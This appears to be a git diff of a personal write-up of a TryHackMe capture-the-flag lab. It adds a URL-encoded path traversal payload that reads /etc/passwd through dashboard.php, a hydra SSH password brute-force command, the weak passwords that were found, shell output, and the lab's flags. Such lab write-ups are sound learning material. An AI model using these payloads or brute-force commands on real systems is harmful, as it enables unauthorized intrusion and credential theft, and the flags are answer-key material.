@@ -12,8 +12,8 @@
 **Time :** 
 	**Start :** 17.03.2025 | 18:38
 	**Break at/to :** 17.03.2025 | 19:31  //  24.03.2025 | 19:10
-	**Finish :** 
-**Satisfaction :**  
+	**Finish :** 24.03.2025 | 20:20
+**Satisfaction :**  6.5/10 Because I use medium but the CTF was not simple.
 ### 1. **Reconnaissance
 
 With #nmap :
@@ -289,16 +289,41 @@ We have the first flag.
 `THM{!50_55Rf_1S_d_k3Y??!}`
 
 
-When we load the `dashboard.php` we can see a possible #fileInclusion. 
+When we load the `dashboard.php` we can see a possible #LFIPoisoning. 
 
 ![[Pasted image 20250324191949.png]]
 
-So let's open #burpsuite.
+And we find that's this one worked :
+
+`....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd`
+
+![[Pasted image 20250324201107.png]]
+
+We find joshua and charles.
+
+Let's try to #bruteForce the passwords.
+
+```BASH
+hydra -l <USER> -P /usr/share/wordlists/fasttrack.txt ssh://10.10.247.254
+```
+
+charles and joshua have both `123456`
+
 ## 5. **Installation
-
-
 
 ## 6. **Command and Control
 
 ## 7. **Actions on Objectives
 
+```BASH
+charles@filepath:~$ ls
+charles@filepath:~$ pwd
+/home/charles
+charles@filepath:~$ ls /var/www/html/
+505eb0fb8a9f32853b4d955e1f9123ea.txt  auth.php       index.php  logout.php   templates
+api.php                               dashboard.php  login.php  profile.php  uploads
+charles@filepath:~$ cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt 
+THM{505eb0fb8a9f32853b4d955e1f9123ea}
+```
+
+There's our last flag.
